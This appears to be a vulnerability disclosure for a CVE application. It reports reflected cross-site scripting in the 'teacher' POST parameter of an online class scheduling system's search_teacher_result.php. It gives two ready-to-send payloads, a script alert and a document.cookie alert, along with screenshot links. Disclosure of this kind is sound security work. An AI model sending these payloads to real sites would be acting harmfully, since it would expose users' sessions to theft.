BUG_Author: joicygiore

Vulnerability File: /online_class_scheduling_system/search_teacher_result.php

Parameter "teacher" (POST), exists reflected cross site scripting vulnerability

Payload1:teacher=--><script>alert(996)</script>&semester=2nd&sy=2012-2013&save=

![image](https://github.com/joicygiore/ApplyForCVE/blob/main/1.png)

Payload2:teacher=--><script>alert(document.cookie)</script>&semester=2nd&sy=2012-2013&save=

![image](https://github.com/joicygiore/ApplyForCVE/blob/main/2.png)
